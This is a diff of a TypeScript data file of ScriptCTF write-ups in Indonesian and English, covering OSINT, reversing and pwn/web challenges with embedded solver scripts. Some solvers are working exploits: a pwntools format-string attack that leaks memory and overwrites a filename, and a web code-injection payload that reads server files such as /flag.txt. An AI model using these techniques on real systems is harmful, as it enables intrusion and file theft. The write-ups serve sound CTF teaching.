+        "title": "Pivot from The New One 1",
         "content": "Pada challenge sebelumnya, member baru yang ditemukan adalah:\n\n    john.hacker.doe1337\n\nDi Discord, profil tersebut menggunakan display name:\n\n    Troller\n\nUsername:\n\n    john.hacker.doe1337\n\nPada profil Discord terdapat tab:\n\n    Activity | Wishlist | No Mutual Friends | 1 Mutual Server\n\nKarena challenge secara eksplisit menyebut **wishlist**, tab tersebut menjadi pivot utama untuk challenge ini.\n\n---"
       },
       {
-        "title": "2. Inspecting the Wishlist",
+        "title": "Inspecting the Wishlist",
         "content": "Wishlist berisi 13 item Discord Collectibles.\n\nDengan membuka **DevTools → Network** ketika membuka tab Wishlist, response API dapat dilihat dan nama item dapat diekstrak.\n\nUrutan item dari response API:\n\n    1. The Hermit\n    2. South Korea\n    3. Enchanted Forest\n    4. Brazil\n    5. Ecuador\n    6. He-Bat\n    7. The Tower\n    8. Oni Mask\n    9. France\n    10. Haiti\n    11. Saudi Arabia\n    12. Iraq\n    13. Woody\n\nWishlist Discord ditampilkan dengan item terbaru terlebih dahulu. Karena itu, urutan item perlu dibalik terlebih dahulu untuk mendapatkan pesan yang ditanam oleh pembuat challenge.\n\n---"
       },
       {
-        "title": "3. Reverse the Order",
+        "title": "Reverse the Order",
         "content": "Setelah dibalik:\n\n    Woody\n    Iraq\n    Saudi Arabia\n    Haiti\n    France\n    Oni Mask\n    The Tower\n    He-Bat\n    Ecuador\n    Brazil\n    Enchanted Forest\n    South Korea\n    The Hermit\n\nKemudian ambil huruf pertama dari setiap item:\n\n    W  Woody\n    I  Iraq\n    S  Saudi Arabia\n    H  Haiti\n    F  France\n    O  Oni Mask\n    T  The Tower\n    H  He-Bat\n    E  Ecuador\n    B  Brazil\n    E  Enchanted Forest\n    S  South Korea\n    T  The Hermit\n\nHasilnya:\n\n    WISHFOTHEBEST\n\nPerhatikan bahwa hasil literalnya adalah:\n\n    WISHFOTHEBEST\n\nbukan:\n\n    WISHFORTHEBEST\n\nJadi tidak perlu menambahkan huruf `R`.\n\n---"
       },
       {
-        "title": "4. Flag",
+        "title": "Flag",
         "content": "Challenge meminta hasil tersebut dibungkus menggunakan format:\n\n    scriptCTF{}\n\nSehingga flag akhirnya:\n\n    scriptCTF{WISHFOTHEBEST}\n\n---"
       },
       {
-        "title": "5. Intended Path",
+        "title": "Intended Path",
         "content": "The New One 1\n           ↓\n    john.hacker.doe1337\n           ↓\n    Discord profile\n           ↓\n    Wishlist\n           ↓\n    Extract item names\n           ↓\n    Reverse order\n           ↓\n    Take first letter of each item\n           ↓\n    WISHFOTHEBEST\n           ↓\n    scriptCTF{WISHFOTHEBEST}\n\n---"
       }
     ],
@@ -563,7 +563,7 @@ export const scriptctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nfrom pwn import *\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"info\"\r\n\r\nHOST = args.HOST or \"challs.scriptsorcerers.xyz\"\r\nPORT = int(args.PORT or 10003)\r\n\r\n\r\ndef start():\r\n    if args.REMOTE or not args.LOCAL:\r\n        return remote(HOST, PORT, timeout=5)\r\n    raise RuntimeError(\"Tidak ada binary lokal di direktori challenge.\")\r\n\r\n\r\ndef recv_prompt(io):\r\n    return io.recvuntil(b\"Enter input: \", timeout=5)\r\n\r\n\r\ndef leak_at(io, address):\r\n    # fgets() hanya menerima 15 byte efektif. Tujuh byte alamat cukup karena\r\n    # byte paling tinggi alamat userspace bernilai nol.\r\n    payload = b\"%7$sAAA\".ljust(8, b\"A\") + p64(address)\r\n    io.sendline(payload)\r\n    data = io.recvuntil(b\"Enter input: \", timeout=5)\r\n    return data.split(b\"AAAA\", 1)[0]\r\n\r\n\r\ndef leak_pointer(io, address):\r\n    data = leak_at(io, address)\r\n    return u64(data[:8].ljust(8, b\"\\0\"))\r\n\r\n\r\ndef exploit(io):\r\n    banner = recv_prompt(io)\r\n    gift = int(banner.split(b\"0x\", 1)[1].split(b\"\\n\", 1)[0], 16)\r\n    log.info(\"gift/stdin GOT: %#x\", gift)\r\n\r\n    # gift = PIE+0x4030, sedangkan \"flop.txt\" berada pada PIE+0x4010.\r\n    # 0x6761 ditulis ke filename+2 sehingga menjadi \"flag.txt\".\r\n    target = gift - 0x1e\r\n    payload = b\"FSOP%26461c%8$hn\" + p64(target)\r\n    assert len(payload) == 24\r\n    log.info(\"PIE base: %#x\", gift - 0x4030)\r\n    log.info(\"filename target: %#x\", target)\r\n    io.sendline(payload)\r\n    output = io.recvrepeat(5)\r\n    marker = b\"Data: \"\r\n    if marker not in output:\r\n        raise RuntimeError(f\"output tidak mengandung {marker!r}: {output!r}\")\r\n    flag = output.split(marker, 1)[1].split(b\"\\n\", 1)[0].strip()\r\n    if b\"{\" not in flag or b\"}\" not in flag:\r\n        raise RuntimeError(f\"data bukan flag valid: {flag!r}\")\r\n    log.success(\"FLAG: %s\", flag.decode(errors=\"replace\"))\r\n    return flag\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    try:\r\n        exploit(io)\r\n    finally:\r\n        io.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -591,24 +591,24 @@ export const scriptctfWriteups: WriteUp[] = [
         "content": "The binary contains a scary crypto validator, but that path is a decoy. The actual flag is stored in `.rodata` as Base64:\n\n    c2NyaXB0Q1RGe24wdF9zMF9oNHJkXzRmdDNyXzRsbH0=\n\nDecoding it gives:\n\n    scriptCTF{n0t_s0_h4rd_4ft3r_4ll}\n\n---"
       },
       {
-        "title": "3. Mencari Data Tersembunyi",
+        "title": "Mencari Data Tersembunyi",
         "content": "Daripada mencoba memecahkan validator crypto, langkah berikutnya adalah memeriksa data statis yang terdapat di dalam binary.\n\nKarena binary Go statically linked, output `strings` cukup ramai oleh string dari Go runtime.\n\nGunakan pencarian terhadap string Base64 yang mencurigakan:\n\n    strings -a -n 16 vault | grep 'c2NyaXB0Q1RG'\n\nDitemukan:\n\n    c2NyaXB0Q1RGe24wdF9zMF9oNHJkXzRmdDNyXzRsbH0=\n\nString tersebut terlihat seperti Base64 karena hanya menggunakan karakter yang valid untuk encoding Base64 dan memiliki padding `=` di akhir.\n\n---"
       },
       {
-        "title": "4. Decode Base64",
+        "title": "Decode Base64",
         "content": "Decode string tersebut:\n\n    echo 'c2NyaXB0Q1RGe24wdF9zMF9oNHJkXzRmdDNyXzRsbH0=' | base64 -d\n\nHasil:\n\n    scriptCTF{n0t_s0_h4rd_4ft3r_4ll}\n\nFlag langsung ditemukan tanpa perlu memecahkan crypto validator.\n\n---"
       },
       {
-        "title": "5. Solver",
+        "title": "Solver",
         "content": "Solver dapat dibuat sederhana dengan mencari string Base64 yang memiliki prefix `c2NyaXB0Q1R`.\n\nContoh penggunaan:\n\n    python3 solve.py ./vault\n\nSolver melakukan langkah:\n\n1. Membaca binary.\n2. Mencari string ASCII yang kemungkinan merupakan Base64.\n3. Decode setiap kandidat.\n4. Mencari pola flag `scriptCTF{...}` pada hasil decode.\n5. Menampilkan flag ketika ditemukan.\n\nOutput:\n\n    FLAG: scriptCTF{n0t_s0_h4rd_4ft3r_4ll}\n\n---"
       },
       {
-        "title": "6. Kesimpulan",
+        "title": "Kesimpulan",
         "content": "Challenge ini sengaja membuat validator terlihat jauh lebih sulit dengan memasukkan proses kriptografi yang kompleks.\n\nJalur yang terlihat:\n\n    User Input\n        ↓\n    HMAC-SHA256\n        ↓\n    SHA256\n        ↓\n    AES-GCM\n        ↓\n    Validation\n\nNamun jalur tersebut merupakan decoy.\n\nJalur sebenarnya jauh lebih sederhana:\n\n    Binary\n        ↓\n    strings\n        ↓\n    Base64 blob\n        ↓\n    Base64 decode\n        ↓\n    Flag\n\nIntinya, sebelum mencoba memecahkan crypto yang terlihat rumit, selalu lakukan pemeriksaan terhadap data statis yang tertanam di binary.\n\n---"
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nscriptCTF - Diabolical solve\r\n\r\nThe crypto validator is a decoy/dead-end. The real flag is left as a base64\r\nstring in the Go binary's rodata.\r\n\"\"\"\r\nfrom __future__ import annotations\r\n\r\nimport base64\r\nimport re\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nFLAG_RE = re.compile(rb\"scriptCTF\\{[^}\\r\\n]+\\}\")\r\nB64_RE = re.compile(rb\"[A-Za-z0-9+/]{16,}={0,2}\")\r\n\r\n\r\ndef find_flag(path: str) -> bytes:\r\n    data = Path(path).read_bytes()\r\n\r\n    # Direct check, just in case.\r\n    m = FLAG_RE.search(data)\r\n    if m:\r\n        return m.group(0)\r\n\r\n    # Decode all plausible base64 blobs from the binary.\r\n    for token in B64_RE.findall(data):\r\n        # base64 length should be multiple of 4; pad defensively.\r\n        padded = token + b\"=\" * ((4 - len(token) % 4) % 4)\r\n        try:\r\n            dec = base64.b64decode(padded, validate=False)\r\n        except Exception:\r\n            continue\r\n        m = FLAG_RE.search(dec)\r\n        if m:\r\n            print(f\"[+] base64 blob: {token.decode(errors='ignore')}\")\r\n            return m.group(0)\r\n\r\n    raise SystemExit(\"[-] flag not found\")\r\n\r\n\r\ndef main() -> None:\r\n    path = sys.argv[1] if len(sys.argv) > 1 else \"./vault\"\r\n    flag = find_flag(path)\r\n    print(flag.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -632,24 +632,24 @@ export const scriptctfWriteups: WriteUp[] = [
     "analysis": "Program menggunakan instruksi `,` untuk membaca input.\n\nSaat diinterpretasikan, program hanya benar-benar mengonsumsi 31 byte input sebelum masuk ke jebakan loop pada bagian akhir.\n\nBagian akhir program berisi loop kosong/infinite loop. Artinya validasi tidak ditunjukkan melalui output secara langsung, tetapi melalui efek samping eksekusi.\n\nObservasi penting:\n\n- Tidak ada output flag secara langsung.\n- Program membaca input kandidat flag.\n- Untuk karakter yang benar, jumlah instruksi Brainfuck yang dieksekusi lebih sedikit.\n- Untuk karakter yang salah, terdapat loop pembersihan seperti `[-]` yang berjalan lebih lama.\n\nHal ini menunjukkan bahwa challenge menggunakan **timing side-channel** atau **step-count side-channel**.\n\n---",
     "solution": [
       {
-        "title": "1. Identifikasi Awal",
+        "title": "Identifikasi Awal",
         "content": "Perintah awal:\n\n    file funk\n    wc -c funk\n    head -c 100 funk\n\nHasil penting:\n\n    funk: ASCII text, with very long lines\n    28786 funk\n    ,>,>,>,>>><<<>,>>>>>>>>...\n\nKarakter yang muncul hanya berupa instruksi Brainfuck seperti:\n\n    + - < > [ ] . ,\n\nJadi pendekatan normal seperti `strings`, `readelf`, atau `objdump` tidak relevan.\n\nFile perlu dianalisis sebagai program Brainfuck.\n\n---"
       },
       {
-        "title": "3. Strategi Solve",
+        "title": "Strategi Solve",
         "content": "Daripada mengandalkan waktu eksekusi asli yang dapat dipengaruhi oleh noise sistem, dibuat interpreter Brainfuck lokal untuk menghitung jumlah instruksi yang dieksekusi.\n\nLangkah solver:\n\n1. Parse program Brainfuck.\n2. Compress operasi berulang seperti `+++++` dan `>>>>` agar eksekusi lebih cepat.\n3. Build jump table untuk pasangan `[` dan `]`.\n4. Jalankan program dengan input dummy untuk mengetahui panjang input yang dikonsumsi.\n5. Untuk setiap posisi flag:\n   - coba semua karakter printable ASCII;\n   - jalankan interpreter;\n   - hitung jumlah instruksi sebelum final infinite loop;\n   - pilih karakter dengan jumlah instruksi paling kecil.\n\nKarena biaya eksekusi per posisi dapat dibedakan, karakter dengan **step count minimum** merupakan karakter flag yang benar.\n\n---"
       },
       {
-        "title": "4. Solver",
+        "title": "Solver",
         "content": "Jalankan:\n\n    python3 solve.py ./funk\n\nOutput:\n\n    FLAG: scriptCTF{t1mm1ng_s1d$_ch@nn31}\n\n---"
       },
       {
-        "title": "5. Catatan Flag",
+        "title": "Catatan Flag",
         "content": "Perhatikan bahwa karakter setelah `s1d` adalah **dollar sign (`$`)**:\n\n    s1d$_ch@nn31\n\nBukan:\n\n    s1d3_ch@nn31\n\nJadi flag yang valid adalah:\n\n    scriptCTF{t1mm1ng_s1d$_ch@nn31}\n\n---"
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nSolver for scriptCTF REV challenge \"F**K\" / funk.\r\n\r\nThe file is a Brainfuck program.  It validates the flag with a timing/step-count\r\nside channel: for every correct byte, fewer Brainfuck instructions are executed.\r\nThis solver interprets the program and brute-forces each printable byte by\r\nchoosing the candidate with the lowest instruction count.\r\n\"\"\"\r\n\r\nimport argparse\r\nimport string\r\nfrom pathlib import Path\r\nfrom typing import Dict, List, Tuple\r\n\r\nInstruction = Tuple[str, int, int]  # op, argument, original source offset\r\n\r\n\r\ndef compile_brainfuck(src: str) -> Tuple[List[Instruction], Dict[int, int]]:\r\n    \"\"\"Compress Brainfuck source and build jump table over compressed ops.\"\"\"\r\n    ops: List[Instruction] = []\r\n    i = 0\r\n\r\n    while i < len(src):\r\n        c = src[i]\r\n\r\n        if c in \"+-\":\r\n            start = i\r\n            delta = 0\r\n            while i < len(src) and src[i] in \"+-\":\r\n                delta += 1 if src[i] == \"+\" else -1\r\n                i += 1\r\n            delta %= 256\r\n            if delta:\r\n                ops.append((\"add\", delta, start))\r\n            continue\r\n\r\n        if c in \"<>\":\r\n            start = i\r\n            delta = 0\r\n            while i < len(src) and src[i] in \"<>\":\r\n                delta += 1 if src[i] == \">\" else -1\r\n                i += 1\r\n            if delta:\r\n                ops.append((\"mov\", delta, start))\r\n            continue\r\n\r\n        if c in \"[],.\":\r\n            ops.append((c, 0, i))\r\n        i += 1\r\n\r\n    stack: List[int] = []\r\n    jump: Dict[int, int] = {}\r\n    for idx, (op, _, _) in enumerate(ops):\r\n        if op == \"[\":\r\n            stack.append(idx)\r\n        elif op == \"]\":\r\n            if not stack:\r\n                raise ValueError(\"unmatched ']' in Brainfuck program\")\r\n            j = stack.pop()\r\n            jump[idx] = j\r\n            jump[j] = idx\r\n    if stack:\r\n        raise ValueError(\"unmatched '[' in Brainfuck program\")\r\n\r\n    return ops, jump\r\n\r\n\r\nclass BFRunner:\r\n    def __init__(self, ops: List[Instruction], jump: Dict[int, int]):\r\n        self.ops = ops\r\n        self.jump = jump\r\n\r\n    def run(self, data: bytes, max_steps: int = 5_000_000) -> Tuple[int, int]:\r\n        \"\"\"\r\n        Return (executed_steps, number_of_input_reads).\r\n\r\n        The challenge ends with a deliberate infinite empty loop.  For scoring,\r\n        stop when such a trap is reached, because every tested candidate reaches\r\n        the same trap and the interesting signal is the step count before it.\r\n        \"\"\"\r\n        tape = [0] * 4096\r\n        ptr = 0\r\n        pc = 0\r\n        ip = 0\r\n        steps = 0\r\n\r\n        while pc < len(self.ops) and steps < max_steps:\r\n            op, arg, _src_off = self.ops[pc]\r\n            steps += 1\r\n\r\n            if op == \"add\":\r\n                tape[ptr] = (tape[ptr] + arg) & 0xFF\r\n            elif op == \"mov\":\r\n                ptr += arg\r\n                if ptr < 0:\r\n                    raise RuntimeError(\"tape pointer moved below zero\")\r\n                if ptr >= len(tape):\r\n                    tape.extend([0] * len(tape))\r\n            elif op == \".\":\r\n                pass\r\n            elif op == \",\":\r\n                tape[ptr] = data[ip] if ip < len(data) else 0\r\n                ip += 1\r\n            elif op == \"[\":\r\n                # Empty [] with non-zero current cell is an intentional hang.\r\n                if tape[ptr] != 0 and self.jump[pc] == pc + 1:\r\n                    break\r\n                if tape[ptr] == 0:\r\n                    pc = self.jump[pc]\r\n            elif op == \"]\":\r\n                if tape[ptr] != 0:\r\n                    pc = self.jump[pc]\r\n\r\n            pc += 1\r\n\r\n        return steps, ip\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Solve the funk Brainfuck challenge\")\r\n    parser.add_argument(\"program\", nargs=\"?\", default=\"funk\", help=\"path to Brainfuck program\")\r\n    parser.add_argument(\r\n        \"--charset\",\r\n        default=string.printable[:-6],  # ASCII 0x20..0x7e\r\n        help=\"candidate characters to try\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    src = Path(args.program).read_text(errors=\"ignore\")\r\n    ops, jump = compile_brainfuck(src)\r\n    runner = BFRunner(ops, jump)\r\n\r\n    # Discover how many input bytes are actually consumed before the final trap.\r\n    _, flag_len = runner.run(b\"A\" * 128)\r\n    print(f\"[+] compiled ops : {len(ops)}\")\r\n    print(f\"[+] input length : {flag_len}\")\r\n\r\n    # Use a neutral printable base.  In this challenge the cost is separable per\r\n    # byte, so the minimum score for each position reveals the expected char.\r\n    flag = bytearray(b\"?\" * flag_len)\r\n    charset = args.charset.encode()\r\n\r\n    for pos in range(flag_len):\r\n        best_ch = None\r\n        best_steps = None\r\n\r\n        for ch in charset:\r\n            trial = bytearray(flag)\r\n            trial[pos] = ch\r\n            steps, _ = runner.run(bytes(trial))\r\n\r\n            if best_steps is None or steps < best_steps:\r\n                best_steps = steps\r\n                best_ch = ch\r\n\r\n        assert best_ch is not None\r\n        flag[pos] = best_ch\r\n        print(f\"[+] pos {pos:02d}: {chr(best_ch)!r}  steps={best_steps}  current={flag.decode()}\")\r\n\r\n    print(f\"\\nFLAG: {flag.decode()}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -667,7 +667,7 @@ export const scriptctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "ScriptCTF",
     "tags": [],
-    "description": "**Category:** Reversing\n**Challenge:** `mc-checker`\n**Flag:** `scriptCTF{n0AIpLz!}`",
+    "description": "",
     "problemDescription": "**Category:** Reversing\n**Challenge:** `mc-checker`\n**Flag:** `scriptCTF{n0AIpLz!}`",
     "tools": [],
     "analysis": "",
@@ -738,7 +738,7 @@ export const scriptctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nMeowvelousShop solver.\r\n\r\nUsage:\r\n  Local : python3 solve_meowvelousshop.py ./chall\r\n  Remote: python3 solve_meowvelousshop.py HOST PORT\r\n\r\nThe valid membership ID triggers the first printf() call. The binary has a\r\npoisoned printf GOT entry, so that lazy binding trampoline calls print_flag().\r\n\"\"\"\r\nimport os\r\nimport re\r\nimport socket\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nMEMBERSHIP_ID = b\"N0Fl4gY37\"\r\nPAYLOAD = b\"2\\n\" + MEMBERSHIP_ID + b\"\\n4\\n\"\r\nFLAG_RE = re.compile(rb\"scriptCTF\\{[^}\\r\\n]+\\}\")\r\n\r\n\r\ndef extract_flag(data: bytes) -> str | None:\r\n    m = FLAG_RE.search(data)\r\n    return m.group(0).decode() if m else None\r\n\r\n\r\ndef run_remote(host: str, port: int) -> bytes:\r\n    out = bytearray()\r\n    with socket.create_connection((host, port), timeout=8) as s:\r\n        s.settimeout(2)\r\n        # Sending all menu answers at once is fine: the program reads line by line.\r\n        s.sendall(PAYLOAD)\r\n        while True:\r\n            try:\r\n                chunk = s.recv(4096)\r\n            except socket.timeout:\r\n                break\r\n            if not chunk:\r\n                break\r\n            out += chunk\r\n    return bytes(out)\r\n\r\n\r\ndef run_local(path: str) -> bytes:\r\n    p = Path(path).resolve()\r\n    cwd = str(p.parent)\r\n    proc = subprocess.run(\r\n        [str(p)],\r\n        input=PAYLOAD,\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.STDOUT,\r\n        cwd=cwd,\r\n        timeout=5,\r\n    )\r\n    return proc.stdout\r\n\r\n\r\ndef main() -> int:\r\n    if len(sys.argv) == 2:\r\n        data = run_local(sys.argv[1])\r\n    elif len(sys.argv) == 3:\r\n        data = run_remote(sys.argv[1], int(sys.argv[2]))\r\n    else:\r\n        print(f\"Usage: {sys.argv[0]} ./chall\", file=sys.stderr)\r\n        print(f\"   or: {sys.argv[0]} HOST PORT\", file=sys.stderr)\r\n        return 1\r\n\r\n    sys.stdout.buffer.write(data)\r\n    if not data.endswith(b\"\\n\"):\r\n        print()\r\n\r\n    flag = extract_flag(data)\r\n    if flag:\r\n        print(f\"\\n[+] flag: {flag}\")\r\n    else:\r\n        print(\"\\n[-] flag not found in output. On local, make sure flag.txt is in the binary directory.\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
@@ -787,7 +787,7 @@ export const scriptctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nimport os\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nTARGET = os.environ.get(\r\n    \"TARGET\",\r\n    \"https://7b5f0d66-18b4-4dbe-a0a2-b5cdb855dc5c.challs.scriptsorcerers.xyz\",\r\n).rstrip(\"/\")\r\nFLAG_RE = re.compile(r\"(?:scriptCTF|CTF|FLAG)\\{[^{}]+\\}\")\r\n\r\n\r\ndef main() -> int:\r\n    url = f\"{TARGET}/the-best-robot\"\r\n    try:\r\n        response = requests.get(url, timeout=10)\r\n        response.raise_for_status()\r\n    except requests.RequestException as exc:\r\n        print(f\"request gagal: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    match = FLAG_RE.search(response.text)\r\n    if not match:\r\n        print(\"flag tidak ditemukan pada response /the-best-robot\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
@@ -900,7 +900,7 @@ export const scriptctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nimport html\r\nimport requests\r\n\r\nTARGET = \"https://9c7da55e-1975-44dc-b680-c6ba9d9e299b.challs.scriptsorcerers.xyz\"\r\n\r\n# byte expression hanya pakai char aman: 6,7,+,-,*\r\nE = {\r\n    46: \"66-6-7-7\",          # .\r\n    47: \"66-7-6-6\",          # /\r\n    97: \"77+7+7+6\",          # a\r\n    102: \"66+6*6\",           # f\r\n    103: \"66+6*6+7-6\",       # g\r\n    108: \"66+7*6\",           # l\r\n    112: \"77+7*7-7-7\",       # p\r\n    116: \"66+7*7+7-6\",       # t\r\n    120: \"77+7*6+7-6\",       # x\r\n}\r\n\r\ndef bpayload(path: str) -> str:\r\n    arr = \"+\".join(f\"[{E[ord(c)]}]\" for c in path)\r\n    return f\"open(next(open(bytes({arr}))))\"\r\n\r\ncandidates = [\r\n    \"/flag.txt\",\r\n    \"/app/flag.txt\",\r\n    \"../flag.txt\",\r\n    \"../../flag.txt\",\r\n]\r\n\r\nfor path in candidates:\r\n    payload = bpayload(path)\r\n    print(\"=\" * 80)\r\n    print(\"[+] path:\", path)\r\n    print(\"[+] payload:\", payload)\r\n    print(\"[+] unique chars:\", len(set(payload.lower())))\r\n\r\n    r = requests.get(TARGET + \"/rate\", params={\"wpm\": payload}, timeout=20)\r\n    text = html.unescape(r.text)\r\n\r\n    print(\"[+] status:\", r.status_code)\r\n    print(\"[+] body length:\", len(text))\r\n\r\n    m = re.search(r\"scriptCTF\\{[^}]+\\}\", text)\r\n    if m:\r\n        print(\"[+] FLAG:\", m.group(0))\r\n        break\r\n\r\n    # bantu debug kalau belum dapat\r\n    err = re.search(r\"(FileNotFoundError|ValueError|TypeError|NameError)[\\s\\S]{0,250}\", text)\r\n    if err:\r\n        print(err.group(0))"
       }
     ],
